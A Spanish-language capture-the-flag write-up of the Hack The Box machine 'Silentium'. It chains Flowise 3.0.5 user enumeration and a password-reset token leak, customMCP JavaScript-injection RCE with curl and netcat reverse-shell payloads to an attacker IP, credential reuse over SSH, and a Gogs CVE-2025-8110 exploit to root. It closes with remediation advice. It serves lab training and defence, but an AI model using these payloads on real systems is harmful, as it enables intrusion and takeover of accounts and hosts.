---
layout: single
title: "HTB Silentium - Writeup"
date: 2026-04-16
difficulty: Fácil
operating_system: Linux
service_hint: Flowise 3.0.5 + Gogs interno
tags: Virtual Host, Flowise, Password Reset, RCE, Credenciales, Gogs, Privilege Escalation
summary: "Cadena de explotación: descubrimiento de un entorno Flowise en staging, toma de cuenta por reseteo inseguro, RCE autenticada en la aplicación, reutilización de credenciales para SSH y escalada final a root mediante Gogs interno vulnerable a CVE-2025-8110."
---

## Información general

| Campo | Valor |
|-------|-------|
| IP | `10.129.28.251` |
| Sistema operativo | Linux |
| Dificultad | Fácil |
| Tags | `Virtual Host`, `Flowise`, `Password Reset`, `RCE`, `Reutilización de credenciales`, `Gogs`, `Privilege Escalation` |

## Reconocimiento

El primer objetivo fue confirmar la superficie mínima expuesta y verificar si la web dependía de nombres virtuales. La combinación `22/tcp` + `80/tcp` ya sugería un flujo clásico de enumeración web con posible acceso posterior por SSH.

Este escaneo inicial sirve para detectar rápidamente los puertos abiertos y descartar ruido.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.28.251
```

Con los puertos localizados, este segundo escaneo profundiza en banners, versiones y redirecciones útiles para orientar la enumeración.

```bash
nmap -p22,80 -sCV 10.129.28.251
```

Indicadores relevantes de esta fase:

- `80/tcp` redirige a `http://silentium.htb/`, así que había que trabajar con virtual host.
- `22/tcp` expone OpenSSH sobre Ubuntu, una superficie candidata para reutilización posterior de credenciales.
- El sitio principal no mostraba funcionalidad sensible directa, así que el siguiente paso correcto era expandir superficie con fuzzing de subdominios.

## Enumeración web

Primero convenía medir si el sitio principal tenía rutas interesantes antes de saltar a hipótesis más complejas.

Este comando enumera directorios visibles en el virtual host principal.

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length 8753
```

El resultado útil fue mínimo, así que el esfuerzo pasó a subdominios. Ese cambio de foco fue el punto correcto: el comportamiento de la web principal parecía deliberadamente austero.

Este comando fuzzea virtual hosts usando el mismo dominio base y filtra respuestas repetidas.

```bash
wfuzz -H "Host: FUZZ.silentium.htb" --hc 404,403 --hh=178 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://silentium.htb
```

Subdominio relevante:

- `staging.silentium.htb`

Una vez hallado el entorno `staging`, lo importante era identificar rápidamente la tecnología detrás de la SPA.

Este comando descarga la portada para inspeccionar referencias a JavaScript y metadatos del frontend.

```bash
curl -s http://staging.silentium.htb | tee index.html
```

Este comando extrae del HTML el bundle principal que luego conviene revisar.

```bash
grep -i js index.html
```

El código cliente y el `view-source` dejaban una pista muy clara: el entorno corría **FlowiseAI**.

Este comando descarga el bundle JavaScript para buscar rutas API embebidas.

```bash
curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js -o main.js
```

Este comando extrae endpoints `/api/v1/` visibles en el bundle y ayuda a priorizar superficies reales del backend.

```bash
grep -oE '/api/v1/[a-zA-Z0-9_/.-]*' main.js | sort -u
```

El endpoint más útil para perfilar la versión era `version`.

Este comando consulta la versión expuesta por la API y confirma el producto objetivo.

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

Salida relevante:

```json
{"version":"3.0.5"}
```

## Toma de cuenta en Flowise

Con Flowise identificado, el siguiente paso lógico fue revisar endpoints de autenticación y recuperación de acceso. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.

Este comando enumera rutas adicionales bajo `/api/v1/` para descubrir superficies no visibles en el bundle inicial.

```bash
gobuster dir -u http://staging.silentium.htb/api/v1/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length=31,3142
```

La ruta especialmente interesante fue `account/forgot-password`, porque permite diferenciar usuarios válidos frente a inexistentes.

Este comando prueba el flujo de recuperación con un correo arbitrario para entender el comportamiento de error.

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"admin@silentium.htb"}}'
```

Una vez validado el patrón, se podía usar fuzzing para descubrir una cuenta real.

Este comando enumera nombres de usuario contra el flujo de reseteo y filtra respuestas negativas.

```bash
wfuzz -z file,/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"FUZZ@silentium.htb"}}' \
  --hc 400 --hs "User Not Found" --hh 104 \
  http://staging.silentium.htb/api/v1/account/forgot-password
```

Usuario identificado:

- `ben@silentium.htb`

El hallazgo crítico aparece al repetir el flujo con la cuenta válida: la respuesta devuelve datos sensibles del usuario, incluyendo un `tempToken` reutilizable para resetear la contraseña.

Este comando invoca el reseteo sobre la cuenta válida y evidencia la fuga de información sensible.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Salida relevante, con valores sensibles redactados:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "[REDACTED]",
    "tempToken": "[REDACTED]"
  }
}
```

Con ese `tempToken`, el takeover era directo.

Este comando completa el cambio de contraseña usando el token temporal expuesto por la propia API.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "[REDACTED]",
      "password": "[REDACTED]"
    }
  }'
```

En este punto ya había acceso legítimo a la interfaz de Flowise como `ben`. Las capturas originales del panel no estaban disponibles en el repositorio, así que ese paso se resume sin imágenes.

## RCE autenticada en Flowise

Con la cuenta comprometida, el siguiente objetivo fue convertir acceso a panel en ejecución remota. El vector útil estaba en la carga de nodos `customMCP`, donde la aplicación evaluaba configuración controlada por el usuario.

Las notas originales incluyen una referencia a una CVE en esta fase, pero no dejan evidencia suficiente para atribuir con rigor un identificador concreto solo a partir del material conservado. Por eso la omito y me centro en el comportamiento observado.

Este comando prueba ejecución de código a través del endpoint `node-load-method/customMCP` usando una API key válida obtenida tras el takeover de la cuenta.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.14.191\");return 1;})()})"
    }
  }'
```

Para confirmar la salida de red desde el objetivo, bastaba exponer un servidor HTTP simple en la máquina atacante.

Este comando levanta un servidor web temporal para verificar el callback del proceso ejecutado en el contenedor.

```bash
python3 -m http.server 80
```

Con la ejecución verificada, el siguiente paso fue pedir una reverse shell.

Este comando prepara un listener para recibir la conexión inversa desde el entorno Flowise.

```bash
nc -nlvp 4444
```

Este comando reemplaza la prueba HTTP por una shell inversa a través del mismo vector `customMCP`.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.191 4444 -e sh\");return 1;})()})"
    }
  }'
```

La shell recibida no pertenecía todavía al host principal, sino al contenedor de la aplicación. El dato decisivo estaba en el entorno: credenciales operativas reutilizadas fuera de Flowise.

Este comando imprime variables de entorno para buscar secretos y contexto de despliegue dentro del contenedor.

```bash
env
```

Valores relevantes, redactados deliberadamente:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=[REDACTED]
SMTP_PASSWORD=[REDACTED]
JWT_AUTH_TOKEN_SECRET=[REDACTED]
JWT_REFRESH_TOKEN_SECRET=[REDACTED]
```

## Acceso al host por SSH

La reutilización más útil fue `FLOWISE_PASSWORD`, porque la cuenta `ben` existía también en el sistema Linux. Antes de perder tiempo con más escape de contenedor, tenía más sentido validar directamente SSH.

Este comando intenta autenticarse al host con la cuenta del sistema usando la credencial reutilizada encontrada en el contenedor.

```bash
ssh ben@silentium.htb
```

La sesión abre correctamente como `ben`, lo que confirma reutilización de credenciales entre la aplicación y el sistema operativo. La flag de usuario existía en `~/user.txt`, pero su valor se omite deliberadamente.

## Enumeración local

Ya dentro del host, lo correcto era revisar puertos locales y servicios no publicados externamente antes de insistir con SUIDs o vectores genéricos.

Este comando enumera servicios en escucha para localizar paneles internos accesibles solo desde localhost.

```bash
ss -tulnp
```

Hallazgos útiles:

- `127.0.0.1:3001` expone un servicio web interno.
- `127.0.0.1:8025` sugiere una consola SMTP o MailHog.

Antes de priorizar Gogs, convenía validar rápidamente si `8025` aportaba credenciales o enlaces de reseteo.

Este comando reenvía el puerto local `8025` hacia la consola MailHog del objetivo.

```bash
ssh -L 8025:127.0.0.1:8025 ben@silentium.htb
```

La consola confirmó que se trataba de MailHog, pero el buzón estaba vacío y no aportó ningún salto adicional.

![Consola MailHog sin mensajes útiles](/images/writeups/silentium/mailhog-empty.png)

La pista realmente prometedora era `3001`, porque los artefactos del sistema apuntaban a una instalación local de **Gogs**.

Este comando busca directorios asociados a Gogs para confirmar la tecnología y su ubicación de despliegue.

```bash
find / -path "*gogs*" -type d 2>/dev/null
```

Para interactuar con el servicio interno desde la máquina atacante sin tocar el firewall del objetivo, lo más limpio era usar tunelización SSH.

Este comando reenvía el puerto local `3001` hacia el Gogs interno del objetivo.

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

El túnel dejaba visible la portada de Gogs y confirmaba que la superficie interna era una forge Git completa, no un servicio auxiliar menor.

![Portada del Gogs interno expuesto por túnel SSH](/images/writeups/silentium/gogs-home.png)

El comportamiento de `Gogs`, sumado a la presencia de directorios de sesión y actividad reciente, justificaba probar un vector conocido de escritura vía symlink en repositorios.

## Escalada a root mediante Gogs

El material fuente incluye un exploit completo que abusa de `CVE-2025-8110`, una vulnerabilidad de Gogs basada en symlink + sobrescritura de `.git/config` para forzar ejecución de comandos del lado del servidor. En este caso sí hay evidencia suficiente para nombrarla porque la PoC está incluida y la explotación termina con shell como `root`.

La instancia además permitía registro de usuarios, lo que hacía posible crear una cuenta desechable y generar un token personal para interactuar con la API sin depender de credenciales privilegiadas previas dentro de Gogs.

![Formulario de registro disponible en el Gogs interno](/images/writeups/silentium/gogs-signup.png)

Una vez creada la cuenta, se generó un token de acceso personal. La captura se conserva porque contextualiza el flujo previo a la PoC, pero el valor del token fue redactado antes de publicarla.

![Generación de token en Gogs con el valor redactado](/images/writeups/silentium/gogs-token-redacted.png)

Antes de lanzar la PoC, hacía falta preparar un listener para la reverse shell resultante.

Este comando levanta un listener con `rlwrap` para recibir una shell más cómoda desde el proceso explotado en Gogs.

```bash
rlwrap nc -lnvp 4444
```

Después, se ejecuta la PoC contra el Gogs interno usando un token API válido. El token se muestra redactado.

Este comando lanza el exploit de `CVE-2025-8110` contra la instancia interna de Gogs tunelizada por SSH.

```bash
python3 exploit.py \
  -u http://127.0.0.1:3001 \
  -lh 10.10.14.191 \
  -lp 4444 \
  --token [REDACTED]
```

La PoC crea un repositorio, sube un symlink a `.git/config`, sobrescribe `sshCommand` con una reverse shell y fuerza a Gogs a ejecutar esa configuración del lado servidor. El resultado es una shell como `root` dentro de la ruta temporal del repositorio local procesado por Gogs.

Con acceso a `root`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.

Este comando lee la flag de `root` desde el host comprometido.

```bash
cat /root/root.txt
```

## Cadena de explotación

```text
Virtual host staging.silentium.htb
-> Flowise 3.0.5 expuesto
-> enumeración de usuarios vía forgot-password
-> fuga de tempToken y reset de contraseña de ben
-> acceso autenticado a Flowise
-> RCE vía customMCP
-> exposición de FLOWISE_PASSWORD en el contenedor
-> reutilización de credenciales por SSH como ben
-> descubrimiento de Gogs interno en 127.0.0.1:3001
-> explotación de CVE-2025-8110
-> shell como root
```

## Lecciones técnicas

- Un flujo de recuperación de cuenta no puede devolver secretos reutilizables al cliente; eso convierte password reset en account takeover.
- En plataformas tipo low-code o AI workflow, cualquier campo evaluado dinámicamente debe tratarse como superficie de RCE.
- Las credenciales de aplicación no deben reutilizarse como contraseña del sistema.
- Un servicio interno accesible solo por localhost sigue siendo explotable si un usuario comprometido puede tunelizarlo por SSH.

## Remediación

1. Corregir el flujo de recuperación de cuentas para que nunca devuelva `tempToken`, hashes ni metadatos sensibles del usuario.
2. Eliminar cualquier evaluación dinámica insegura en nodos `customMCP` o mecanismos equivalentes de Flowise.
3. Segregar credenciales entre aplicación, correo y sistema operativo.
4. Actualizar o aislar Gogs para eliminar la exposición a `CVE-2025-8110` y revisar permisos de uso de tokens API internos.
